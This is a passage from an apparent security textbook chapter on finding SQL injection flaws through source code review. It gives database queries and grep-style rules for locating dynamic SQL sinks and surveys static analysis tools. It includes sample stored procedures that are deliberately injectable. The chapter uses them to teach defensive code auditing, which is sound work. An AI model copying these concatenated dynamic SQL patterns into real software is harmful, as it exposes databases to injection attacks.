Oracle 9i, 10g and 11g  \n-- Author: Alexander Kornbrust of Red- Database- Security GmbH  \n-- \nselect distinct a.owner,a.name,b.authid,a.text SQLTEXT  \nfrom all_source a,all_procedures b  \nwhere (  \nlower(text) like ‘%execute%immediate%(%||%)%’  \nor lower(text) like ‘%dbms_sql%’  \nor lower(text) like ‘%grant%to%’  \nor lower(text) like ‘%alter%user%identified%by%’  \nor lower(text) like ‘%execute%immediate%’’%||%’  \nor lower(text) like ‘%dbms_utility.exec_ddl_statement%’  \nor lower(text) like ‘%dbms_ddl.create_wrapped%’  \nor lower(text) like ‘%dbms_hs_passthrough.execute_immediate%’  \nor lower(text) like ‘%dbms_hs_passthrough.parse%’  \nor lower(text) like ‘%owa_util.bind_variables%’  \nor lower(text) like ‘%owa_util.listprint%’  \nor lower(text) like ‘%owa_util.tableprint%’  \nor lower(text) like ‘%dbms_sys_sql.%’  \nor lower(text) like ‘%ltadm.execsql%’  \nor lower(text) like ‘%dbms_prvtaqim.execute_stmt%’  \nor lower(text) like ‘%dbms_streams_rpc.execute_stmt%’  \nor lower(text) like ‘%dbms_aqadm_sys.execute_stmt%’  \nor lower(text) like ‘%dbms_streams_adm_utl.execute_sql _string%’  \nor lower(text) like ‘%initjvmaux.exec%’  \nor lower(text) like ‘%dbms_repcat_sql_utl.do_sql%’  \nor lower(text) like ‘%dbms_aqadm_syscalls.kwqa3_gl_executestmt%’  \n) \nand lower(a.text) not like ‘% wrapped%’  \nand a.owner=b.owner  \nand a.name=b.object_name  \nand a.owner not in (‘OLAPSYS’,‘ORACLE_OCM’,‘CTXSYS’,‘OUTLN’,‘SYSTEM’,‘EXFSYS’, \n‘MDSYS’,‘SYS’,‘SYSMAN’,‘WKSYS’,‘XDB’,‘FLOWS_040000’,‘FLOWS_030000’,‘FLOWS_030100’, \n‘FLOWS_020000’,‘FLOWS_020100’,‘FLOWS020000’,‘FLOWS_010600’,‘FLOWS_010500’, ‘FLOWS_010400’)  \norder by 1,2,3  \nTo analyze the source of a T -SQL procedure from within a Microsoft SQL Server database \nprior to Microsoft SQL Server 2008 you can use the sp_helptext  stored procedure. The \nsp_helptext  stored procedure displays the definition that is used to cre ate an object in multiple \nrows. Each row contains 255 characters of the T -SQL definition. The definition resides in the \ndefinition column in the sys.sql_modules  catalog view. For example, you can use the following \nSQL statement to view the source code of a stored procedure:  \nEXEC sp_helptext SP_StoredProcedure;  \nCREATE PROCEDURE SP_StoredProcedure @input varchar(400) = NULL AS  \nDECLARE @sql nvarchar(4000)  \nSELECT @sql = ‘SELECT field FROM table WHERE field = ’’’ + @input + ’’’’  \nEXEC (@sql)  \nIn the preceding exam ple, the @input  variable is taken directly from the user input and \nconcatenated with the SQL string ( @sql). The SQL string is passed to the EXEC function as a \nparameter and is executed. The preceding Microsoft SQL Server stored procedure is \nvulnerable to S QL injection even though the user input is being passed to it as a parameter.  \nTwo commands that you can use to invoke dynamic SQL are sp_executesql  and EXEC() . \nEXEC()  has been around since SQL 6.0; however, sp_executesql  was added in SQL 7. \nsp_executesql  is a built -in stored procedure that takes two predefined parameters and any \nnumber of user -defined parameters. The first parameter, @stmt , is mandatory and contains a \nbatch of one or more SQL statements. The data type of @stmt  is ntext in SQL 7 and SQL 2000, \nand nvarchar(MAX) in SQL 2005 and later. The second parameter, @params , is optional. EXEC()  \ntakes one parameter which is an SQL statement to execute. The parameter can be a concatenation of string variables and string literals. The following is an example of a vulnerable stored procedure that uses the \nsp_executesql  stored procedure:  \nEXEC sp_helptext SP_StoredProcedure_II;  \nCREATE PROCEDURE SP_StoredProcedure_II (@input nvarchar(25))  \nAS \nDECLARE @sql nvarchar(255)  \nSET @sql = ‘SELECT field FROM table WHERE field = ’’’ + @input + ’’’’  \nEXEC sp_executesql @sql  \nYou can use the following T -SQL command to l ist all of the stored procedures in the \ndatabase:  \nSELECT name FROM dbo.sysobjects WHERE type =‘P’ ORDER BY name asc  \nYou can use the following T -SQL script to search all stored procedures within an SQL \nServer database server (note that this does not work on SQL Server 2008) to find a T -SQL \ncode that is potentially vulnerable to SQL injection. You will need to closely scrutinize the \noutput, but it should help you to narrow your search:  \n-- Description: A T- SQL script to search the DB for potentially vulnerable  \n-- T-SQL code  \n-- @text – search string ‘%text%’  \n-- @dbname - database name, by default all databases will be searched  \n-- \nALTER PROCEDURE [dbo].[grep_sp]@text varchar(250),  \n@dbname varchar(64) = null  \nAS BEGIN  \nSET NOCOUNT ON;  \nif @dbname is null begin --enumerate all databases.  \nDECLARE #db CURSOR FOR Select Name from master…sysdatabases  \ndeclare @c_dbname varchar(64)  \nOPEN #db FETCH #db INTO @c_dbname  \nwhile @@FETCH_STATUS <> -1begin execute grep_sp @text, @c_dbname  \nFETCH #db INTO @c_dbname  \nend \nCLOSE #db DEALLOCATE #db  \nend \nelsebegin declare @sql varchar(250)  \n--create the find like command  \nselect @sql = ‘select ’’’ + @dbname + ’’’ as db, o.name,m.definition’  \nselect @sql = @sql + ‘ from ‘+@dbname+’.sys.sql_modules m’  \nselect @sql = @sql + ‘ inner join ‘+@dbname+’…sysobjects o on m.object_id=o.id’  \nselect @sql = @sql + ‘ where [definition] like ‘‘%’+@text+‘%’’’  \nexecute (@sql)  \nend \nEND \nMake sure you drop the procedure when you’re finished! You can invoke the stored \nprocedure like this:  \nexecute grep_sp ‘sp_executesql’;  \nexecute grep_sp ‘EXEC’;  \nYou can use the following T -SQL command to list user -defined stored procedures on an \nSQL Server 2008 database:  \nSELECT name FROM sys.procedures ORDER BY name asc  \nYou can use the following T -SQL script to search all stored procedures within an SQL \nServer 2008 database server and print their source, if the respective line is uncommented. You \nwill need to closely scrutinize the output, but it should help you to narrow your search:  \nDECLARE @name VARCHAR(50) -- database name  \nDECLARE db_cursor CURSOR FOR  \nSELECT name FROM sys.procedures;  \nOPEN db_cursor  \nFETCH NEXT FROM db_cursor INTO @name  \nWHILE @@FETCH_STATUS = 0  \nBEGINprint @name  \n-- uncomment the line below to print the source  \n-- sp_helptext ‘‘+ @name + ’’  \nFETCH NEXT FROM db_cursor INTO @name  \nEND \nCLOSE db_cursor  \nDEALLOCATE db_cursor  \nThere are two MySQL -specific statements for obtaining information about stored \nprocedures. The first one, SHOW PROCEDURE STATUS , will output a list of stored procedures and \nsome information (Db, Name, Type, Definer, Modified, Created, Security_type, Comment) about them. The output from the following command has been modified for readability:  \nmysql> SHOW procedure STATUS;  \n| victimDB | SP_StoredProcedure_I | PROCEDURE | root@localhost | DEFINER  \n| victimDB | SP_StoredProcedure_II | PROCEDURE | root@localhost | DEFINER  \n| victimDB | SP_StoredProcedure_III | PROCEDURE | root@localhost | DEFINER  \nThe second command, SHOW CREATE PROCEDURE sp_name , will output the source of the \nprocedure:  \nmysql> SHOW CREATE procedure SP_StoredProcedure_I \\ G \n∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗ 1. row ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗  \nProcedure: SP_ StoredProcedure  \nsql_mode:  \nCREATE Procedure: CREATE DEFINER=‘root’@’localh ost’ PROCEDURE SP_ StoredProcedure (input \nvarchar(400))  \nBEGIN  \nSET @param = input;  \nSET @sql = concat(‘SELECT field FROM table WHERE field=’,@param);  \nPREPARE stmt FROM @sql;  \nEXECUTE stmt;  \nDEALLOCATE PREPARE stmt;  \nEnd \nOf course, you can also obtain information regarding all stored routines by querying the \ninformation_schema  database. For a database named dbname, use this query on the \nINFORMATION_SCHEMA.ROUTINES table:  \nSELECT ROUTINE_TYPE, ROUTINE_NAME  \nFROM INFORMATION_S CHEMA.ROUTINES  \nWHERE ROUTINE_SCHEMA=‘dbname’;  \n \n \nAutomated source code review  \nAs previously stated, performing a manual code review is a long, tedious, and laborious \nprocess that requires becoming very familiar with the application source code as well as learning all of the intricacies of each application reviewed. In this chapter, you learned how \nyou should approach the task in a methodical way and how you can make extensive use of command -line search utilities to narrow the focus of a review, saving valuable  time. However, \nyou will still have to spend a lot of time looking at the source code inside text editors or within your chosen IDE. Even with a mastery of freely available command -line utilities, a source \ncode review is a daunting task. So, would it not be much nicer to automate the process, perhaps even using a tool that would generate an aesthetically pleasing report? Well, yes it would, but you should be aware that automated tools can produce a large number of false positives (a false positive is when a  tool reports incorrectly that a vulnerability exists, when in fact one does not) \nor false negatives (a false negative is when a tool does not report that a vulnerability exists, when in fact one does). False positives lead to distrust in the tool and a lot of time is spent \nverifying results, whereas false negatives result in a situation where vulnerabilities may go undiscovered and a false sense of security prevails.  \nSome automated tools use regular expression string matching to identify sinks (security -\nsensitive functions) and nothing more. There are tools that can identify sinks that directly pass \ntainted (untrusted) data as parameters to sinks. And there are tools that combine these capabilities with the ability to also identify sink sources (points in the application where \nuntrusted data originate). Several of these tools simply rely on the same strategy as we have just discussed, that is, relying heavily on grep- like syntax searches and regular expressions to \nlocate the use of dangerous functions and, i n some cases, simply highlighting codes that \nincorporates dynamic SQL string -building techniques. These static string -matching tools are \nincapable of accurately mapping data flows or following execution paths. String pattern matching can lead to false posi tives, as some of the tools used to perform the pattern matching \nare unable to make distinctions between comments in codes and actual sinks. In addition, some regular expressions may match codes that are named similar to the target sinks. For example, a regular expression that attempts to match the \nmysql_query()  function of a sink may also flag the \nfollowing lines of code:  \n// validate your input if using mysql_query()  \n$result = MyCustomFunctionToExec_mysql_query($sql);  \n$result = mysql_query($sql);  \nTo counte r this, some tools implement an approach known as lexical analysis . Lexical \nanalysis is the process of taking an input string of characters (such as the source code of a \ncomputer program) and producing a sequence of symbols called lexical tokens , or just tokens , \nwhich may be handled more easily by a parser. These tools preprocess and tokenize source files (the same first steps a compiler would take) and then match the tokens against a library of security -sensitive functions. Programs performing lexical anal ysis are often referred to as \nlexical analyzers . Lexical analysis is necessary to reliably distinguish variables from functions \nand to identify function arguments.  \nSome source code analyzers, such as those that operate as plug -ins to an IDE, often make \nuse of an abstract syntax tree (AST). An AST is a tree representation of the simplified \nsyntactic structure of the source code. You can use an AST to perform a deeper analysis of the source elements to help track data flows and identify sinks and sink sources . \nAnother method that some source code analyzers implement is data flow analysis, a process \nfor collecting information about the use, definition, and dependencies of data in programs. The data flow analysis algorithm operates on a control flow graph (CFG) generated from the AST. \nYou can use a CFG to determine the parts of a program to which a particular value assigned to a variable might propagate. A CFG is a representation, using graph notation, of all paths that might be traversed through a program during  its execution.  \nAt the time of this writing, automated tools incorporate three distinct methods of analysis: \nstring -based pattern matching, lexical token matching, and data flow analysis via an AST \nand/or a CFG. Automated static code analysis tools can be very useful in helping security consultants identify dangerous coding behaviors that incorporate security -sensitive functions \nor sinks, and make the task of identifying sink sources by tracing tainted data back to its origin (entry point) much simpler. How ever, you should not rely blindly on their results. Although in \nsome ways they are an improvement over manual techniques, they should be used by security -\nconscientious developers or skilled and knowledgeable security consultants who can contextualize their  findings and make an informed decision on their validity. I also recommend \nthat you use any automated tool in conjunction with at least one other tool as well as a manual investigation of the code utilizing the techniques presented in this chapter. This c ombined \napproach will give you the highest level of confidence in your findings and allow you to eradicate the majority of false positives as well as to help you identify false negatives. These tools don’t eliminate the need for a human reviewer; a certain  level of security acumen is \nrequired to use the tools correctly. Web application programming languages are rich, \nexpressive languages that you can use to build anything, and analyzing arbitrary code is a difficult job that requires a lot of context. These  tools are more like spell checkers or grammar \ncheckers; they don’t understand the context of the code or the application and can miss many important security issues.  \nGraudit  \nGraudit is a simple shell script and collection of signature sets that allows you  to find potential \nsecurity flaws in the source code using the GNU utility grep. It’s comparable to other static \nanalysis applications while keeping the technical requirements to a minimum and being very flexible. Writing your own graudit signatures is rel atively easy. Mastering regular expressions \ncan be helpful, but in their simplest form a list of words will do. For example the rules below can be used for PostgreSQL:  \npg_query\\ s∗\\(.∗\\$.∗\\) \npg_exec\\ s∗\\(.∗\\$.∗\\) \npg_send_query\\ s∗\\(.∗\\$.∗\\) \npg_send_query_para ms\\s∗\\(.∗\\$.∗\\) \npg_query_params\\ s∗\\(.∗\\$.∗\\) \npg_send_prepare\\ s∗\\(.∗\\$.∗\\) \npg_prepare \\s∗\\(.∗\\$.∗\\) \npg_execute \\s∗\\(.∗\\$.∗\\) \npg_insert\\ s∗\\(.∗\\$.∗\\) \npg_put_line\\ s∗\\(.∗\\$.∗\\) \npg_select\\ s∗\\(.∗\\$.∗\\) \npg_update\\ s∗\\(.∗\\$.∗\\) \n• URL:  www.justanotherhacker.com/projects/graudit.html  \n• Language:  asp, jsp, perl, php and python (write your own configuration file and regular \nexpressions for any language)  \n• Platforms:  Windows, Linux, and OS X (requires bash, grep, and sed)  \n• Price:  Free \nYet Another Source Code Analyzer (YASCA)  \nYASCA is an open source program that looks for security vulnerabilities and code -quality \nissues in program source codes. It analyzes PHP, Java, C/C++, and JavaScript (by default) for \nsecurity and code- quality issues. YASCA is extensible via a plug -in-based architecture. It \nintegrates other open source programs such as FindBugs ( http://findbugs.sourceforge .net), \nPMD ( http://pmd.sourceforge.net ), and Jlint ( http://artho.com/jlint). You can use the tool to \nscan other languages by writing rules or integrating external tools. It is a command -line tool, \nwith reports being generated in HTML, CSV, XML, and other formats. The tool flags the use of potentially dangerous functions when they are used in conjunction with input that is taken directly from an HTTP request (low -hanging fruit)  for JSP files. The tool isn’t perfect; \nhowever, the developer is committed to improving it. You can easily extend the tool by writing your own custom rule files:  \n• URL:  www.yasca.org  \n• Language:  Write your own configur ation file and regular expressions for any language  \n• Platforms:  Windows and Linux  \n• Price:  Free \nPixy  \nPixy is a free Java program that performs automatic scans of the PHP 4 source code, aimed at the detection of cross -site scripting (XSS) and SQL injection  vulnerabilities. Pixy analyzes the \nsource code for tainted variables. The tool then traces the flow of the data through the application until it reaches a dangerous function. It is also capable of identifying when a variable is no longer tainted (i.e. it has been passed through a sanitization routine). Pixy also draws dependency graphs for tainted variables. The graphs are very useful for understanding a vulnerability report. With dependency graphs, you can trace the causes of warnings back to the source v ery easily. However, Pixy fails to identify SQL injection vulnerabilities within the \nmysql_db_query() , ociexecute() , and odbc_exec()  functions. Nonetheless, it is easy to write your \nown configuration file. For example, you can use the following sink file t o search for the \nmysql_db_query()  function:  \n# mysql_db_query SQL injection configuration file for user -defined sink  \nsinkType = sql  \nmysql_db_query = 0  \nUnfortunately Pixy currently supports only PHP 4:  \n• URL:  http://pixybox.seclab.tuwien.ac.at/pixy  \n• Language:  PHP (Version 4 only)  \n• Platforms:  Windows and Linux  \n• Price:  Free \nAppCodeScan \nAppCodeScan is a tool you can use to scan source codes for a number of vulnerabilities, one of \nwhich is SQL injection. It uses regular expression strings matching to identify potentially dangerous functions and strings in the code base and comes up with a number of configuration files. The tool does not positively identify the existence of a vulnerability. It merely identifies the usage of functions that could lead to the presence of a vulnerability. You can also use AppCodeScan to identify entry points int o the application. Also very useful is the ability to \ntrace parameters through the code base. This tool runs on the .NET Framework and at the time of this writing was still in initial beta state. It will be a favorite for those who prefer working in a GUI as apposed to the command line. Configuration files are simple to write and modify. Here is the default regular expression for detecting potential SQL injection vulnerabilities in .NET code:  \n#Scanning for SQL injections  \n.∗.SqlCommand. ∗?|.∗.DbCommand.∗ ?|.∗.OleDbCommand.∗ ?|.∗.SqlUtility.∗ ?| \n.∗.OdbcCommand.∗ ?|.∗.OleDbDataAdapter.∗ ?|.∗.SqlDataSource.∗ ? \nIt is as trivial a task to add the OracleCommand()  function as it is to write a custom regular \nexpression for PHP or Java. You can use the following rule for PHP:  \n# PHP SQL injection Rules file for AppCodeScan  \n# Scanning for SQL injections  \n.∗.mssql_query.∗ ?|.∗.mysql_query.∗ ?|.∗.mysql_db_query.∗ ?|.∗.oci_parse.∗ ?|.∗.ora_parse.∗ ?|.∗.ms\nsql_bind.∗ ?|.∗.mssql_execute.∗ ?|.∗.odbc_prepare. ∗?|.∗.odbc_execute.∗ ?|.∗.odbc_execute.∗ ?|.∗\n.odbc_exec.∗ ? \n• URL:  www.blueinfy.com  \n• Language:  Write your own configuration file and regular expressions for any language  \n• Platform: Windows  \n• Price:  Free \nOWASP LAPSE+ Project  \nLAPSE+ is a security scanner for detecting vulnerabilities, specifically the injection of \nuntrusted data in Java EE Applications. It has been developed as a plug -in for  the Eclipse Java \nDevelopment Environment ( www.eclipse.org ), working specifically with Eclipse Helios and \nJava 1.6 or higher. LAPSE+ is based on the GPL software LAPSE, developed by Benjamin Livshits as part of the Griffin Software Security Project. This new release of the plugin developed by Eva lues Lab of Universidad Carlos III de Madrid provides more features to \nanalyze the propagation of the malicious data through the application and includes the identification of new vulnerabilities. LAPSE+ targets the following Web application vulnerabilitie s: Parameter Tampering, URL Tampering, Header Manipulation, Cookie \nPoisoning, SQL Injection, Cross -site Scripting (XSS), HTTP Response Splitting, Command \nInjection, Path Traversal, XPath Injection, XML Injection, and LDAP Injection. LAPSE+ performs taint s tyle analysis in order to determine if it is possible to reach a Vulnerability \nSource from a Vulnerability Sink by performing backward propagation through the different assignations. LAPSE+ is highly customizable; the configuration files shipped with the plug- in \n(sources.xml and sinks.xml) can be edited to augment the set of source and sink methods, respectively:  \n• URL:  www.owasp.org/index.php/OWASP_LAPSE_Project  \n• Language:  Java J2EE  \n• Plat forms:  Windows, Linux, and OS X  \n• IDE:  Eclipse  \n• Price:  Free \nMicrosoft Source Code Analyzer for SQL Injection  \nThe Microsoft Source Code Analyzer for SQL Injection tool is a static code analysis tool that \nyou can use to find SQL injection vulnerabilities in Active Server Pages (ASP) code. The tool \nis for ASP classic and not .NET code. In addition, the tool understands only classic ASP codes that are written in VBScript. It does not analyze server -side codes that are written in any other \nlanguages, such as JS cript: \n• URL:  http://support.microsoft.com/kb/954476 \n• Language:  ASP classic (VBScript)  \n• Platform: Windows  \n• Price:  Free \nMicrosoft Code Analysis Tool .NET (CAT.NET)  \nCAT.NET is a binary code analysis tool that helps you to identify common variants of certain prevailing vulnerabilities that can give rise to common attack vectors such as XSS, SQL injection, and XPath injection. CAT.NET is a snap- in to Visual Studio 2005 or 2008 that helps \nto identify security flaws within a managed code (C#, Visual Basic .NET, J#) application. It does so by scanning the binary and/or assembly of the application, and tracing the data flow among its statements, methods, and assemblies. This  includes indirect data types such as \nproperty assignments and instance tainting operations. Note that CAT.NET has not been made available separately for Visual  Studio 2010 or later as it has been integrated into the Code \nAnalysis functionality within the product (only available in Premium and Ultimate editions): \n• URL:  www.microsoft.com/download/en/details.aspx?id=19968 \n• Languages:  C#, Visual Basic .NET, and J# \n• Platform: Windows  \n• IDE:  Visual Studio  \n• Price:  Free \nRIPS —A Static Source Code Analyzer for Vulnerabilities in PHP \nScripts  \nRIPS is a tool written in PHP that can be used to leverage static code analysis techniques to \nfind vulnerabilities in PHP applications. By tokenizing a nd parsing all source code files, RIPS \nis able to transform the PHP source code into a program model. It is then possible to detect sensitive sinks (potentially vulnerable functions) that can be tainted by user input (influenced by a malicious user) during the program flow. RIPS also offers an integrated code audit \nframework for further manual analysis:  \n• URL:  http://rips -scanner.sourceforge.net/  \n• Language:  PHP  \n• Platform: OS X, Windows, and Linux  \n• Price:  Free \nCodePro AnalytiX  \nCodePro AnalytiX seamlessly integrates into the Eclipse environment, using automated source code analysis to pinpoint quality issues and security vulnerabilities. There are a large number of preconfigured audit rules available.  The “Tainted User Input” rule can be used to look for \npotential execution paths from a source to a sink. It is important to note that the paths it finds are potential in the sense that CodePro is performing a static analysis and therefore cannot know whet her a specific execution path is ever followed in practice. There are also a number \nof SQL specific audit rules available that can help identify SQL injection issues. It is not trivial to create your own audit rules, but it is also not too complex a task ( see \nhttp://code.google.com/javadevtools/codepro/doc/features/audit/audit_adding_new_rules.html )\n: \n• URL:  http://code.google.com/javadevtools/codepro/doc/index.html  \n• Language:  Java, JSP, JSF, Struts, Hibernate and XML  \n• Platform: OS X, Windows, and Linux  \n• Price:  Free \nTeachable Static Analysis Workbench  \nTeachable Static Analysis Workbench (TeSA) allows security analysts to evaluate Java Web \napplications in order to find security vulnerabilities connected with improper input validation. \nThe main difference of TeSA from the previous static analyzers is that TeSA requires the analyst  to “teach” (configure) the tool to find all vulnerabilities that can be expressed as data \nflows from a taint source through to a sensitive sink. For example to “teach” the tool how to identify SQL injection issues the analyst has to mark the \nHttpServletRe quest.getParameter()  \nmethod as a source of tainted data and mark the statement.executeQuery()  function as a \nsensitive sink. Another TeSA feature distinguishing it from other static analyzers is the ability to mark methods that reliably untaint data by perf orming suitable validation. Tainted data that \nthen pass through the marked functions becomes untainted and are not reported. The static analyzer is implemented as a plugin to the FindBugs ( http://findbugs.sourceforge.net ) tool.  \nThe current release of TeSA supports servlets and Java Server Pages in Web applications \nonly, and doesn’t have built -in support of any Web application framework:  \n• URL:  http://code.g oogle.com/p/teachablesa/  \n• Language:  JAVA Servlet Pages  \n• IDE:  Eclipse IDE for Java EE Developers 3.4 (Ganymede)  \n• Platform: Windows and Linux  \n• Price:  Free \nCommercial Source Code Review Tools  \nCommercial Source Code Analyzers (SCAs) are designed to integrate within the development life cycle of an application. Their goal is to ultimately assist the application developer in eradicating vulnerabilities in application source codes as well as in hel ping him to produce \nmore inherent secure codes. They do this by providing education and knowledge with regard to the coding mistakes that lead to the presence of security vulnerabilities, as well as by empowering the developer with the tools and skills to easily adhere to secure coding practices. \nEach tool is marketed in its own unique way and the marketing material available for each one \nis extensive. The purpose of this section is not to recommend a particular product over another; it is very difficult to  find good impartial comparison reviews for these products. Furthermore, \nit is not an easy task to find technical details on the exact approach or methodology used by each product —that is, without getting lost in public relations and sales material!  \nThe li st presented is by no means extensive, but serves to introduce more advanced tool \nsuites for readers who may require such things. I have worked with a number of clients to successfully integrate solutions that incorporated both commercial off -the-shelf (CO TS) and \nfree and open source software (FOSS) source code analyzers and tool suites. The approach and products chosen in each situation are modified to individual requirements. Good quality assurance techniques can be effective in identifying and eliminatin g vulnerabilities during the \ndevelopment stage. Penetration testing, fuzz testing, and source code audits should all be incorporated as part of an effective quality assurance program. Improving the software development process and building better software are ways to improve software security (i.e. by producing software with fewer defects and vulnerabilities). Many COTS software packages are available to support software security assurance activities. However, before you use these \ntools, you must carefully evaluate them and ensure that they are effective. I suggest that before parting with what can be very large sums of money, you perform your own comprehensive product evaluation. To research the tools, you can use the free trials that are available from the  \ncompanies’ Web sites or contact a sales representative.  \nNotes from the underground…  \nThe Right Tool for the Job  \nImplementing SCAs into the development life cycle does not automatically result in the production of secure \napplication code. Tools that impleme nt metrics based on historical data in an attempt to provide management with \npretty graphs and trend analysis reports that inadvertently lead to reprimands for developers or project leads for \nfailing to meet arbitrary targets can be counterproductive. Just  like hackers, developers can be very capable of \nfinding ingenious ways to “beat the system” so that metrics are favorable (i.e. producing codes in such a manner \nthat the SCA does not flag their code). This can lead to vulnerabilities being resident within  the code and not \nbeing identified.  \nIn addition, if the developer does not understand why a vulnerability is being reported and the tool does not \nprovide sufficient information to instill a comprehensive understanding, he can be lulled into believing that the \nalert is nothing more than a false positive. There are a couple of very public and well -known examples of such \nsituations occurring in the code of the RealNetworks RealPlayer software (CVE -2005- 0455, CAN -2005- 1766, \nand CVE -2007- 3410). The published vul nerability announcements contained the vulnerable lines of source codes. \nThe ignore directive for a popular SCA (Flawfinder) was appended to the vulnerable lines. The tool had reported \nthe vulnerability, but instead of fixing it, a developer had added the ignore directive to the code so that the tool \nwould stop reporting the vulnerability!  \nRemember the old proverb: “A bad workman always blames his tools”! In these situations, it may be easy to \nblame the tool for failing to deliver. However, this is not the case. You should never rely on just one tool, and \ninstead should leverage multiple tools and techniques during the development of the life cycle. In addition, \nmultiple experienced and knowledgeable individuals should perform audits at different stages of t he project to \nprovide assurances that implemented processes and procedures are being followed. Developers shouldn’t be \nreprimanded harshly; instead, they should be given constructive feedback and education where necessary so that \nthey learn from the proces s and ultimately produce more secure codes. Code analysis tools should be used as \nguidelines or preliminary benchmarks as opposed to definitive software security solutions.  \nFortify Source Code Analyzer \nSource code analyzer is a static analysis tool that pr ocesses codes and attempts to identify \nvulnerabilities. It uses a build tool that runs on a source code file or set of files and converts the \nfile(s) into an intermediate model that is then optimized for security analysis:  \n• URL:  www.fortify.com/products/hpfssc/source -code -analyzer.html  \n• Languages:  Over 18 development languages  \n• Platforms:  Windows, Mac, Solaris, Linux, AIX, and HP -UX \n• IDEs:  Support for several environments, such as Microsoft Visual Studio, Eclipse, \nWebSphere Application Developer, and IBM Rational Application Developer  \n• Price:  Contact to request quote  \nRational AppScan Source Edition \nAppScan Source Edition is a static analysis tool that identifies vulnerabilities through reviewing data and call flows. Similar to Fortify, it is designed to integrate into enterprise development processes, as well as being able to be run locally by an individual:  \n• URL:  www.ibm.com/software/rational/products/appscan/source/  \n• Languages:  Over 15 development languages  \n• Platforms:  Windows, Solaris, and Linux  \n• IDEs:  Microsoft Visua l Studio, Eclipse, and IBM Rational Application Developer  \n• Price:  Contact to request quote  \nCodeSecure  \nCodeSecure is available as an enterprise- level appliance or as a hosted software service. \nCodeSecure Workbench is available as a plug -in to the Visual Studio, Eclipse, and IBM \nRational Application Developer IDEs. CodeSecure is based on pattern- free algorithms; it \ndetermines the behavioral outcomes of input data by calculating all possible execution paths. \nDuring analysis, each vulnerability is traced back to the original entry point and line of code that caused it, providing a map of the vulnerability propagation through the application:  \n• URL:  www.armorize.com  \n• Languages:  Java, PHP, ASP, and .NET  \n• Platform: Web -based \n• IDEs:  Visual Studio, Eclipse, and IBM Rational Application Developer  \n• Price:  Contact to request quote  \nKlocwork Solo \nKlocwork Solo is a stand- alone source code analysis tool for individual Java developers \nfocused on mobile and Web application developm ent. It is advertised that the Eclipse plugin \ncan automatically find critical issues such as Resource Leaks, NULL Pointer Exceptions, SQL Injections, and Tainted Data:  \n• URL:  www.klocwork.com/products/ solo/  \n• Language:  Java  \n• Platform: Windows 32 bit  \n• IDEs:  Eclipse  \n• Price:  Contact to request quote  \nSummary  \nIn this chapter, you learned how to review source codes using manual static code analysis \ntechniques to identify taint -style vulnerabilities. You wi ll need to practice the techniques and \nmethods you learned before you become proficient in the art of code auditing; however, these skills will help you better understand how SQL injection vulnerabilities are still a common occurrence many years after they  were brought to the attention of the public. The tools, \nutilities, and products we discussed should help you put together an effective toolbox for scrutinizing source codes, not only for SQL injection vulnerabilities but also for other common coding error s that can lead to exploitable vectors.  \nTo help you practice your skills, try testing them against publicly available vulnerable \napplications that have exploitable published security vulnerabilities. I recommend downloading the The Open Web Application Sec urity Project (OWASP) Broken Web \nApplications Project. It is distributed as a Virtual Machine in VMware format. It can be downloaded from http://code.google.com/p/owaspbwa/wiki/ProjectSu mmary . It includes \napplications from various sources and consists of training applications, realistic and intentionally vulnerable applications as well as many old versions of real applications. A quick Google search for “Vulnerable Web Applications” will also give you plenty of target applications. \nTry as many of the automated tools listed in this chapter as you can until you find a tool that \nworks for you. Don’t be afraid to get in touch with the developers and provide them constructive feedback with rega rd to how you think the tools could be improved, or to \nhighlight a condition that reduces its effectiveness. I have found them to be receptive and committed to improving their tools. Happy hunting!  \nSolutions fast track  \nReviewing Source Code for SQL Injection  \n• There are two main methods of analyzing source codes for vulnerabilities: static code \nanalysis and dynamic code analysis. Static code analysis, in the context of Web application security, is the process of analyzin g source codes without actually executing the code. \nDynamic code analysis is the analysis of code performed at runtime.  \n• Tainted data are data that have been received from an untrusted source (sink source), whether \nit is a Web form, cookie, or input param eter. Tainted data can potentially cause security \nproblems at vulnerable points in a program (sinks). A sink is a security -sensitive function \n(e.g. a function that executes SQL statements).  \n• To perform an effective source code review and identify all pote ntial SQL injection \nvulnerabilities, you need to be able to recognize dangerous coding behaviors, identify \nsecurity -sensitive functions, locate all potential methods for  handling user -controlled input, \nand trace tainted data back to their origin via their execution path or data flow. \n• Armed with a comprehensive list of search strings, the simplest and most straightforward \napproach to conducting a manual source code review is to use the UNIX utility grep (also available for Windows systems).  \nAutomated Sourc e Code Review  \n• At the time of this writing, automated tools incorporate three distinct methods of analysis: \nstring -based pattern matching, lexical token matching, and data flow analysis via an abstract \nsyntax tree (AST) and/or a control flow graph (CFG).  \n• Some automated tools use regular expression string matching to identify sinks that pass \ntainted data as a parameter, as well as sink sources (points in the application where untrusted data originates).  \n• Lexical analysis is the process of taking an input  string of characters and producing a \nsequence of symbols called lexical tokens. Some tools preprocess and tokenize source files and then match the lexical tokens against a library of sinks. \n• An AST is a tree representation of the simplified syntactic str ucture of source code. You can \nuse an AST to perform a deeper analysis of the source elements to help track data flows and identify sinks and sink sources.  \n• Data flow analysis is a process for collecting information about the use, definition, and \ndependen cies of data in programs. The data flow analysis algorithm operates on a CFG \ngenerated from an AST.  \n• You can use a CFG to determine the parts of a program to which a particular value assigned \nto a variable might propagate. A CFG is a representation, using  graph notation, of all paths \nthat might be traversed through a program during their execution. \nFrequently Asked Questions  \nQ: If I implement a source code analysis suite into my development life cycle will my software \nbe secure?  \nA: No, not by itself. Good quality assurance techniques can be effective in identifying and \neliminating vulnerabilities during the development stage; penetration testing, fuzz testing, and \nsource code audits should all be incorporated as part of an effective quality assurance progra m. \nA combined approach will help you produce software with fewer defects and vulnerabilities. A tool can’t replace an intelligent human; a manual source code audit should still be performed as part of a final QA.  \nQ: Tool X gave me a clean bill of health. Does that mean there are no vulnerabilities in my \ncode?  \nA: No, you can’t rely on any one tool. Ensure that the tool is configured correctly and compare \nits results with the results you obtained from at least one other  tool. A clean bill of health from \na correctly configured and effective tool would be very unusual in the first review.  \nQ: Management is very pleased with the metrics reports and trend analysis statistics that tool \nX presents. How trustworthy are this data ? \nA: If the tool reports on real findings that have been independently verified as being actual \nvulnerabilities, as opposed to reporting on how many alerts were raised, it can probably be very useful in tracking your return on investment.  \nQ: Grep and awk are GNU hippy utilities for the unwashed beardy Linux users; surely there is \nan alternative for us Windows guys and girls?  \nA: Grep and awk are available on Windows systems too. If that still feels to dirty to you, you \ncan use the 